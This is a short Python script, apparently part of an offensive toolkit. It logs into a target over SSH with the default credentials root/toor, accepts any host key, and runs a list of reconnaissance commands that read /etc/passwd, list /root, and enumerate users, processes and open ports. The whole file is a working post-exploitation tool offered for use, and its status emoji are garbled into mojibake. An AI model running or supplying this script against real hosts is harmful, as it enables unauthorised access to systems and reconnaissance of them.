# exploit/post_ssh.py
import paramiko
import time

COMMANDS = [
    'whoami',
    'uname -a',
    'id',
    'cat /etc/passwd',
    'netstat -tuln',
    'ps aux',
    'ls -la /root',
]

def run(ip, port, username='root', password='toor'):
    print(f"[üîê] Attempting post-SSH exploitation on {ip}:{port}...")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=username, password=password, timeout=5)

        for cmd in COMMANDS:
            print(f"[üíª] Running: {cmd}")
            stdin, stdout, stderr = client.exec_command(cmd)
            time.sleep(0.5)
            output = stdout.read().decode()
            print(output.strip())

        client.close()
        print("[‚úÖ] Post-exploitation complete.")
    except Exception as e:
        print(f"[‚ùå] SSH post-exploitation failed: {e}")
